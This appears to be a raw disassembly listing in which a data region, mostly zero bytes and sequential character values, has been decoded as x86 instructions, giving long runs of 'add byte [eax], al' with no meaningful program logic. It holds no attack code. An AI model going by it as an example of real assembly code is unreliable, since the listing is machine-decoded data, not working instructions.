add byte [eax + eax], ah
add byte [edi], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809bb0a
add byte [eax], al
popal
add byte [eax], al
add byte [eax + eax], ah
add byte [edi], ch
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
pop esi
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
jae 0x809bb32
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809bb4e
add byte [eax], al
jae 0x809bb52
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809bb6e
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
push edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
popal
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
jno 0x809bc4a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
inc ebx
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ah
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc edi
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x61000000
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
dec ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
dec ebp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
je 0x809bd16
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [bx + si], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
outsd dx, dword [esi]
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
jo 0x809bdae
add byte [eax], al
add byte cs:[eax], al
add byte [ebp], ch
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
push eax
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [edx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809bdea
add byte [eax], al
jb 0x809bdee
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebx
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edi
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
je 0x809be76
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte cs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jge 0x809bf9e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte es:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte ds:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp eax, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809c3f6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809c402
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809c40e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809c41a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809c426
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809c432
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809c43e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809c44a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809c456
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809c462
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809c46e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jnp 0x809c47a
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jl 0x809c486
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jge 0x809c492
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jle 0x809c49e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound eax, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte fs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul eax, dword [eax], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809c696
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x809c6a2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809c6ae
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x809c6ba
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809c6c6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809c6d2
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809c6de
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809c6ea
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809c6f6
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809c702
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809c70e
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
